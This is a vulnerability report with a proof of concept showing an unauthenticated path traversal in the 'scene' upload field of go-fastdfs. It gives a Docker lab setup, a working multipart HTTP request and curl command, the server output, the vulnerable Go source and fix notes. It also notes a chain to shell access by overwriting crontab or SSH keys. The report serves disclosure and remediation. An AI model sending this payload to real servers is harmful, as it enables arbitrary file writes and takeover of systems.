### Vulnerability details

**Official website / Product:** https://github.com/sjqzhang/go-fastdfs

**Repository:** sjqzhang/go-fastdfs (stars at selection: 4140)

**Vulnerability type:** file_upload (`scene` path traversal → arbitrary file write / getshell chain)

**Vulnerability versions:** master `7fc193140a5a921db057be1f7b01b5148e10b87f` (2026-07-11 tip; still vulnerable after the CVE-2023-1800 `path` dot-strip fix). Defaults: `scenes=[]`, `auth_url=""`, `enable_custom_path=true`, `rename_file=false`.

**Vulnerability URL / Parameter:** `POST /group1/upload` form field `scene` (compat alias `scenes`); upload is **unauthenticated** when default empty `auth_url`.

**Complex:** yes

### Verification procedure

1. From the campaign root (requires `repos/go-fastdfs` at commit `7fc193140a5a921db057be1f7b01b5148e10b87f`), rebuild the lab with the Dockerfile and compose below. Original `labs/gofastdfs-r34-a4/` and image `gofastdfs-r34-a4:local` were removed after audit. Host port **21404→8080**, container name `gofastdfs-r34-a4`. `GO_FASTDFS_DIR=/usr/local/go-fastdfs/data`, so `STORE_DIR=/usr/local/go-fastdfs/data/files`. First start auto-writes default conf (`scenes=[]`, `auth_url=""`).

Dockerfile (save e.g. as `Dockerfile.gofastdfs-r34-a4` at campaign root; builds vendored tip `fileserver`):

```dockerfile
FROM golang:1.22-alpine AS builder
WORKDIR /src
COPY repos/go-fastdfs/ .
RUN CGO_ENABLED=0 GOOS=linux go build -mod=vendor -o /fileserver .

FROM alpine:3.20
RUN mkdir -p /usr/local/go-fastdfs/data/conf /usr/local/go-fastdfs/data/data \
	/usr/local/go-fastdfs/data/files /usr/local/go-fastdfs/data/log
COPY --from=builder /fileserver /usr/local/go-fastdfs/fileserver
RUN chmod +x /usr/local/go-fastdfs/fileserver
WORKDIR /usr/local/go-fastdfs
ENV GO_FASTDFS_DIR=/usr/local/go-fastdfs/data
ENV PATH=/usr/local/go-fastdfs:$PATH
EXPOSE 8080
CMD ["fileserver", "server"]
```

`docker-compose.yml` (same directory as the Dockerfile, or adjust `dockerfile:`; `context` must be campaign root so `COPY repos/go-fastdfs/` works):

```yaml
services:
  gofastdfs:
    build:
      context: .
      dockerfile: Dockerfile.gofastdfs-r34-a4
    image: gofastdfs-r34-a4:local
    container_name: gofastdfs-r34-a4
    ports:
      - "21404:8080"
    environment:
      GO_FASTDFS_DIR: /usr/local/go-fastdfs/data
    volumes:
      - gofastdfs_data:/usr/local/go-fastdfs/data
volumes:
  gofastdfs_data:
```

Start:

```bash
docker compose -f docker-compose.yml up -d --build
```

Wait until `127.0.0.1:21404` answers, then send the PoC.

2. (Control) Confirm CVE-2023-1800 `path` is fixed: `path=../../../../../../tmp/x` lands under `STORE_DIR/tmp/x` only, not host/container `/tmp`.
3. Send the PoC below with `scene=../../../../../../tmp/r34a4-verified-scene`, multipart file `pwned.txt`, body `R34A4-SCENE-PWN-1793584430` (27 bytes including trailing newline). Use `output=json2`. No Cookie/Token required.
4. Expect HTTP 200 and JSON `status=ok`; response `path`/`scene` echo the traversal `scene` unchanged.
5. Confirm arbitrary write inside the container (date/hour dirs follow upload time; trust the response JSON `path`):
   ```bash
   docker exec gofastdfs-r34-a4 ls -la /tmp/r34a4-verified-scene/20261102/01/53/5/pwned.txt
   docker exec gofastdfs-r34-a4 cat /tmp/r34a4-verified-scene/20261102/01/53/5/pwned.txt
   ```
   Expected output:
   ```
   -rw-r--r--    1 root     root            27 Nov  2 01:53 /tmp/r34a4-verified-scene/20261102/01/53/5/pwned.txt
   R34A4-SCENE-PWN-1793584430
   ```
6. Impact chain: same privileges can overwrite crontab, `authorized_keys`, or app config for getshell (depends on process user; lab container often runs as root).

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /group1/upload HTTP/1.1
Host: 127.0.0.1:21404
User-Agent: r34-a4-gofastdfs-audit
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr34a4Scene01
Content-Length: 440

------WebKitFormBoundaryr34a4Scene01
Content-Disposition: form-data; name="output"

json2
------WebKitFormBoundaryr34a4Scene01
Content-Disposition: form-data; name="scene"

../../../../../../tmp/r34a4-verified-scene
------WebKitFormBoundaryr34a4Scene01
Content-Disposition: form-data; name="file"; filename="pwned.txt"
Content-Type: application/octet-stream

R34A4-SCENE-PWN-1793584430
------WebKitFormBoundaryr34a4Scene01--
```

Optional equivalent curl (write the 27-byte payload including newline first):

```bash
printf 'R34A4-SCENE-PWN-1793584430\n' > /tmp/pwned.txt
curl -sS -D- "http://127.0.0.1:21404/group1/upload" \
  -F 'output=json2' \
  -F 'scene=../../../../../../tmp/r34a4-verified-scene' \
  -F 'file=@/tmp/pwned.txt;filename=pwned.txt;type=application/octet-stream'
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Authorization, Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, X-Requested-By, If-Modified-Since, X-File-Name, X-File-Type, Cache-Control, Origin
Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: Authorization
Date: Mon, 02 Nov 2026 01:53:50 GMT
Content-Length: 666
Content-Type: text/plain; charset=utf-8
Connection: close

{
  "data": {
    "domain": "http://127.0.0.1:21404",
    "md5": "ba04856f560b2187ef2be84b22d8688f",
    "mtime": 1793584430,
    "path": "/group1/../../../../../../tmp/r34a4-verified-scene/20261102/01/53/5/pwned.txt",
    "retcode": 0,
    "retmsg": "",
    "scene": "../../../../../../tmp/r34a4-verified-scene",
    "scenes": "../../../../../../tmp/r34a4-verified-scene",
    "size": 27,
    "src": "/group1/../../../../../../tmp/r34a4-verified-scene/20261102/01/53/5/pwned.txt",
    "url": "http://127.0.0.1:21404/group1/../../../../../../tmp/r34a4-verified-scene/20261102/01/53/5/pwned.txt?name=pwned.txt\u0026download=1"
  },
  "message": "",
  "status": "ok"
}
```

Verification result notes:

- HTTP 200, `status=ok`; response echoes the traversal `scene` in `path`/`scene`/`scenes`.
- Container file `/tmp/r34a4-verified-scene/20261102/01/53/5/pwned.txt` contains `R34A4-SCENE-PWN-1793584430`.
- Control: `path` traversal blocked by dot-strip; `X-Forwarded-For: 127.0.0.1` no longer bypasses IsPeer (GetRealIp).

### Vulnerability analysis

After CVE-2023-1800 the project strips `.` from the custom `path` field, but **`scene` is never path-sanitized**. With default empty `scenes`, `CheckScene` returns `true, nil` for any value. `SaveUploadFile` builds `STORE_DIR/{scene}/{date}/...`, so `scene=../../../../../../tmp/evil` creates directories and files outside the storage root via `MkdirAll`/`os.Create`. Upload is unauthenticated when `auth_url` is empty. Impact is arbitrary file write; on real hosts this can chain to getshell (cron, SSH keys, config overwrite).

Trigger / sink source (full path and line numbers relative to `repos/go-fastdfs`):

```go
# File: repos/go-fastdfs/server/http_upload.go
# CheckScene: 54-68 (empty scenes allowlist → allow all)
func (c *Server) CheckScene(scene string) (bool, error) {
	var (
		scenes []string
	)
	if len(Config().Scenes) == 0 {
		return true, nil
	}
	for _, s := range Config().Scenes {
		scenes = append(scenes, strings.Split(s, ":")[0])
	}
	if !c.util.Contains(scene, scenes) {
		return false, errors.New("not valid scene")
	}
	return true, nil
}

# Read scene / assign / validate: 233-281
scene = r.FormValue("scene")
code = r.FormValue("code")
if scene == "" {
	//Just for Compatibility
	scene = r.FormValue("scenes")
}
// ...
fileInfo.Scene = scene
if _, err = c.CheckScene(scene); err != nil {
	result.Message = err.Error()
	w.Write([]byte(c.util.JsonEncodePretty(result)))
	log.Error(err)
	return
}

# SaveUploadFile join + MkdirAll: 419-435
if fileInfo.Scene != "" {
	folder = fmt.Sprintf(STORE_DIR+"/%s/%s", fileInfo.Scene, folder)
} else {
	folder = fmt.Sprintf(STORE_DIR+"/%s", folder)
}
// ...
if !c.util.FileExists(folder) {
	if err = os.MkdirAll(folder, 0775); err != nil {
		log.Error(err)
	}
}
```

Control (fixed `path` dot-strip, same file 228-231):

```go
fileInfo.Path = r.FormValue("path")
//replace . to ""
fileInfo.Path = strings.Replace(fileInfo.Path, ".", "", -1)
fileInfo.Path = strings.Trim(fileInfo.Path, "/")
```

### Fix notes

1. Reject `..`, absolute paths, and backslashes in `scene`; after Clean, enforce the resolved path stays under `STORE_DIR` (`strings.HasPrefix(realpath, storeRoot+string(os.PathSeparator))`).
2. Deploy with a non-empty `scenes` allowlist and `auth_url`.
3. Apply the same containment check to every user-controlled path segment (`scene` / `path` / `filename`→ReName, etc.).
